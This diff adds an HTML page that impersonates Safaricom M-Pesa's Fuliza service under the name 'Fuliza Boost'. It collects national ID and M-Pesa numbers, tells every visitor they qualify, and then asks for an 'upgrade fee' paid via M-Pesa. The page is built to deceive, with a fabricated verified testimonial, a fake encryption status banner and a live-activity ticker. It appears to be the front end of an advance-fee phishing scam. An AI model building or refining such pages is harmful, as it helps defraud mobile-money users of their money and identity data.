@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Fuliza Boost Upgrade</title>
+
+<link rel="stylesheet" href="style.css">
+
+<link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
+
+</head>
+
+<body>
+
+<!-- Loading Screen -->
+
+<div id="loader">
+
+<div class="spinner"></div>
+
+<p>Checking Eligibility...</p>
+
+</div>
+<div class="support-bar">
+
+<div class="support-left">
+<i class="fas fa-headset"></i>
+24/7 LIVE SUPPORT
+</div>
+
+<div class="support-center">
+0722 000 000
+</div>
+
+<div class="support-right">
+<i class="fas fa-comments"></i>
+Live Chat with Zuri Agent
+</div>
+
+</div>
+
+<!-- Header -->
+
+<header>
+
+<div class="logo">
+
+<i class="fas fa-shield-alt"></i>
+
+Fuliza Boost
+
+</div>
+
+<div class="support">
+
+<i class="fas fa-headset"></i>
+
+24/7 Support
+
+</div>
+
+</header>
+<div class="status">
+    <span class="online"></span>
+    <span>SYSTEM STATUS: ONLINE | ENCRYPTION: AES-256</span>
+</div>
+<!-- Progress -->
+
+<div class="progress">
+
+<div class="step active">
+
+1
+
+<p>Eligibility</p>
+
+</div>
+
+<div class="line"></div>
+
+<div class="step">
+
+2
+
+<p>Upgrade</p>
+
+</div>
+
+<div class="line"></div>
+
+<div class="step">
+
+3
+
+<p>Payment</p>
+
+</div>
+
+</div>
+<!-- PAGE 1 -->
+
+<section id="page1" class="page active">
+
+<div class="container">
+
+<div class="card">
+
+<div class="icon">
+    <i class="fas fa-shield-alt"></i>
+</div>
+
+<h1>
+Safaricom M-Pesa Fuliza Boost
+</h1>
+
+<p class="subtitle">
+INSTANT LIMIT INCREASE • SAME DAY ACCESS
+</p>
+
+<input
+type="number"
+id="idNumber"
+placeholder="Enter National ID Number"
+required>
+
+<input
+type="tel"
+id="phone"
+placeholder="Enter M-Pesa Number"
+required>
+
+<button id="checkBtn">
+Check My Fuliza Eligibility →
+</button>
+
+<p id="message"></p>
+
+</div>
+
+<div class="feedback">
+
+<h2>
+<i class="far fa-comments"></i>
+Real-Time User Feedback
+</h2>
+
+<div class="review">
+
+<div class="avatar">
+DL
+</div>
+
+<div class="review-text">
+
+<strong>
+David L.
+<span style="color:#28a745;">● Verified</span>
+</strong>
+
+<p>
+"My limit moved from 2k to 70k in under 10 mins. Highly recommended!"
+</p>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</section>
+
+<!-- PAGE 2 -->
+
+<section id="page2" class="page">
+
+<h2>
+
+Choose Your Upgrade
+
+</h2>
+
+<div id="loanList">
+
+</div>
+
+</section>
+
+<!-- PAGE 3 -->
+
+<section id="page3" class="page">
+
+<div class="card">
+
+<h2>
+
+Complete Payment
+
+</h2>
+
+<div class="summary">
+
+<div>
+
+Loan Limit
+
+<span id="loanAmount">
+
+KSh 0
+
+</span>
+
+</div>
+
+<div>
+
+Upgrade Fee
+
+<span id="loanFee">
+
+KSh 0
+
+</span>
+
+</div>
+
+</div>
+
+<input
+
+type="tel"
+
+id="stkPhone"
+
+placeholder="Enter M-Pesa Number">
+
+<button id="payBtn">
+
+Pay via M-Pesa
+
+</button>
+
+<p id="paymentStatus"></p>
+
+</div>
+
+</section>
+
+<!-- Success Popup -->
+
+<div id="successPopup">
+
+<div class="popup">
+
+<div class="check">
+
+✔
+
+</div>
+
+<h2>
+
+Congratulations!
+
+</h2>
+
+<p>
+
+Your number qualifies for a Fuliza Upgrade.
+
+</p>
+
+<button id="continueBtn">
+
+Continue
+
+</button>
+
+</div>
+
+</div>
+    <div id="liveActivity" class="live-activity">
+    <div class="icon">⚡</div>
+
+    <div class="content">
+        <small>LIVE ACTIVITY</small>
+        <p id="activityText"></p>
+    </div>
+</div>
+    
+
+<script src="script.js"></script>
+
+</body>
+</html>
